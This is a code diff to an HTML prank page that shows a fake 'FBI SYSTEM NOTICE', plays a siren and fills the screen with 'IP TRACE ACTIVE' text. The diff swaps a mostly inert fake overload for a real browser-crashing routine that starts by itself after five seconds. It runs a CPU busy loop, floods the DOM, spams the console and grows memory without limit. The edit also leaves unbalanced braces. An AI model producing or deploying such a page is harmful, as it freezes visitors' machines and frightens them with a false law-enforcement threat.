@@ -84,7 +84,6 @@
     }
 
     #overloadStatus {
-      display: none;
       margin-top: 20px;
       font-size: 1.5em;
       color: red;
@@ -114,156 +113,56 @@
     const audio = document.getElementById("siren");
     audio.volume = 1.0;
 
-    // Ensure autoplay works when user interacts
+    // Ensure autoplay works on interaction
     window.addEventListener('click', () => {
       if (audio.paused) audio.play();
     });
 
-    // Show warning after 5s
-    setTimeout(() => {
-      document.getElementById("warning").style.display = "block";
-
-      // Ask for overload permission
-      setTimeout(() => {
-        const allow = confirm("⚠ FBI SYSTEM NOTICE:\nAre you sure you want to see the FBi Database?");
-        if (allow) {
-          startOverload();
-        } else {
-       startOverload();
-        }
-      }, 1000);
+  
+        startOverload();
+      }
     }, 5000);
 
-    // Fake overload function
     function startOverload() {
-      const status = document.getElementById("overloadStatus");
-      status.innerText = "Starting FBI database...";
-      status.style.display = "block";
+      const status = document.getElementById('overloadStatus');
+      status.style.display = 'block';
+      status.innerText = 'Starting browser overload...';
 
-      // Start creating DOM elements rapidly
-      let count = 0;
-      const interval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
-          const div = document.createElement("div");
-          div.innerText = "█ FBI ACCESS LOG █  IP TRACE ACTIVE █";
-          div.style.position = "absolute";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.color = "red";
-          div.style.fontSize = "12px";
-          div.style.pointerEvents = "none";
+      // 1. CPU-intensive busy loop chunk repeatedly (without freezing immediately)
+      function cpuIntensiveTask() {
+        let i = 0;
+        while (i < 1e8) i++;
+        setTimeout(cpuIntensiveTask, 0);
+      }
+      cpuIntensiveTask();
+
+      // 2. Rapid DOM element creation
+      setInterval(() => {
+        for (let i = 0; i < 1000; i++) {
+          const div = document.createElement('div');
+          div.innerText = "█ FBI ACCESS LOG █ IP TRACE ACTIVE █";
+          div.style.position = 'absolute';
+          div.style.top = Math.random() * window.innerHeight + 'px';
+          div.style.left = Math.random() * window.innerWidth + 'px';
+          div.style.color = 'red';
+          div.style.fontSize = '12px';
+          div.style.pointerEvents = 'none';
           document.body.appendChild(div);
         }
+      }, 10);
 
-        count++;
-        if (count > 2147483640) clearInterval(interval); // enough to simulate lag
-      }, 2147483640);
-    }
+      // 3. Console spam huge strings
+      setInterval(() => {
+        console.log('█'.repeat(1e6));
+      }, 100);
 
- // Fake overload function
-    function startOverload() {
-      const status = document.getElementById("overloadStatus");
-      status.innerText = "Starting FBI database...";
-      status.style.display = "block";
+      // 4. Memory hog with infinite array push
+      let arr = [];
+      setInterval(() => {
+        arr.push(new Array(1e6).fill('*'));
+      }, 10);
 
-      // Start creating DOM elements rapidly
-      let count = 0;
-      const interval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
-          const div = document.createElement("div");
-          div.innerText = "█ FBI ACCESS LOG █  IP TRACE ACTIVE █";
-          div.style.position = "absolute";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.color = "red";
-          div.style.fontSize = "12px";
-          div.style.pointerEvents = "none";
-          document.body.appendChild(div);
-        }
-
-        count++;
-        if (count > 2147483640) clearInterval(interval); // enough to simulate lag
-      }, 2147483640);
-    }
-
-     // Fake overload function
-    function startOverload() {
-      const status = document.getElementById("overloadStatus");
-      status.innerText = "Starting FBI database...";
-      status.style.display = "block";
-
-      // Start creating DOM elements rapidly
-      let count = 0;
-      const interval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
-          const div = document.createElement("div");
-          div.innerText = "█ FBI ACCESS LOG █  IP TRACE ACTIVE █";
-          div.style.position = "absolute";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.color = "red";
-          div.style.fontSize = "12px";
-          div.style.pointerEvents = "none";
-          document.body.appendChild(div);
-        }
-
-        count++;
-        if (count > 2147483640) clearInterval(interval); // enough to simulate lag
-      }, 2147483640);
-    }
-
-
-     // Fake overload function
-    function startOverload() {
-      const status = document.getElementById("overloadStatus");
-      status.innerText = "Starting FBI database...";
-      status.style.display = "block";
-
-      // Start creating DOM elements rapidly
-      let count = 0;
-      const interval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
-          const div = document.createElement("div");
-          div.innerText = "█ FBI ACCESS LOG █  IP TRACE ACTIVE █";
-          div.style.position = "absolute";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.color = "red";
-          div.style.fontSize = "12px";
-          div.style.pointerEvents = "none";
-          document.body.appendChild(div);
-        }
-
-        count++;
-        if (count > 2147483640) clearInterval(interval); // enough to simulate lag
-      }, 2147483640);
-    }
-
-
-     // Fake overload function
-    function startOverload() {
-      const status = document.getElementById("overloadStatus");
-      status.innerText = "Starting FBI database...";
-      status.style.display = "block";
-
-      // Start creating DOM elements rapidly
-      let count = 0;
-      const interval = setInterval(() => {
-        for (let i = 0; i < 100; i++) {
-          const div = document.createElement("div");
-          div.innerText = "█ FBI ACCESS LOG █  IP TRACE ACTIVE █";
-          div.style.position = "absolute";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.color = "red";
-          div.style.fontSize = "12px";
-          div.style.pointerEvents = "none";
-          document.body.appendChild(div);
-        }
-
-        count++;
-        if (count > 2147483640) clearInterval(interval); // enough to simulate lag
-      }, 2147483640);
+      // Note: Recursive stack overflow intentionally omitted to avoid instant crash.
     }
   </script>
 </body>
